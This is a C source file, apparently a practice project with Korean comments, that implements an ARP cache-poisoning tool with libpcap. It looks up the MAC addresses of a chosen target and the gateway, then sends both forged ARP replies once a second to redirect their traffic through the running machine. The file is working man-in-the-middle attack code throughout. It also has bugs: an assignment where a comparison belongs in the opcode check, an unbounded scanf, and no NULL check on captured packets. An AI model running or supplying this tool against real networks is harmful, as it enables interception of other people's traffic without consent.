#include <sys/time.h>
#include <netinet/in.h>
#include <pcap/pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include "networkinfo.h"
#include "arp.h"

int gett_mac(const u_char *packet, u_char *t_mac, char* t_ip);

int main(void){
    char *dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct pcap_pkthdr hdr;
    const u_char *packet;
    u_char sp_buf[MTUSIZE], s_ip[IPSIZE], t_ip[IPSIZE], s_mac[MACASIZE], t_mac[MACASIZE], g_ip[IPSIZE], g_mac[MACASIZE];
    pcap_t *pcd;  // packet capture descriptor

    dev = pcap_lookupdev(errbuf); // 디바이스 이름
    if (dev == NULL)    {
        printf("%s\n", errbuf);
        exit(1);
    }

    pcd = pcap_open_live(dev, BUFSIZ,  1, 1000, errbuf);
    if (pcd == NULL){
        printf("%s\n", errbuf);
        exit(1);
    }

    printf("Target IP Address: ");
    scanf("%s", t_ip);

    if((sendarpreq(pcd, dev, sp_buf, t_ip)) == -1){
        pcap_perror(pcd,0);
        pcap_close(pcd);
        exit(1);
    }
    while(1){
        packet = pcap_next(pcd, &hdr);
        if(gett_mac(packet, t_mac, t_ip) == 1)
            break;
    }

    getGIPAddress(dev, g_ip);
    makearpreq(dev, sp_buf, g_ip);
    if((sendarpreq(pcd, dev, sp_buf, g_ip)) ==-1) {
        pcap_perror(pcd,0);
        pcap_close(pcd);
        exit(1);
    };
    while(1){
        packet = pcap_next(pcd, &hdr);
        if(gett_mac(packet, g_mac, g_ip) == 1)
            break;
    }
    getMIPAddress(dev, s_ip);
    getMMACAddress(dev, s_mac);

    while(1){
        printf("send arp reply packet\n");
        if((sendarprep(pcd ,dev, sp_buf, g_ip, s_mac, t_ip, t_mac)) ==-1) {
            pcap_perror(pcd,0);
            pcap_close(pcd);
            exit(1);
        };
        if((sendarprep(pcd, dev, sp_buf, t_ip, s_mac, g_ip, g_mac)) ==-1) {
            pcap_perror(pcd,0);
            pcap_close(pcd);
            exit(1);
        };
        sleep(1);
    }
    return 0;
}
int gett_mac(const u_char *packet, u_char * t_mac, char* t_ip){
    struct ether_header *etheh; // Ethernet 헤더 구조체
    unsigned short ether_type;

    // 이더넷 헤더를 가져온다.
    etheh = (struct ether_header *)packet;
    packet += sizeof(struct ether_header);
    // 네트워크 패킷은 big redian 이라서 little redian형식으로 바꿔준다.
    ether_type = ntohs(etheh->ether_type);

    if (ether_type == ETHERTYPE_ARP){
        struct ether_arp *arph; // arp 헤더 구조체
        arph = (struct ether_arp *)packet;
        packet += sizeof(struct ether_arp);
        if(arph->ea_hdr.ar_op = ARP_OPER_REP){
            char tip[16];
            inet_ntop(AF_INET, &arph->arp_spa, tip, sizeof(tip));
            if(!strcmp(tip, t_ip)){
                memcpy(t_mac, arph->arp_sha, MACASIZE);
                return 1;
            }
        }
    }
    return 0;
}
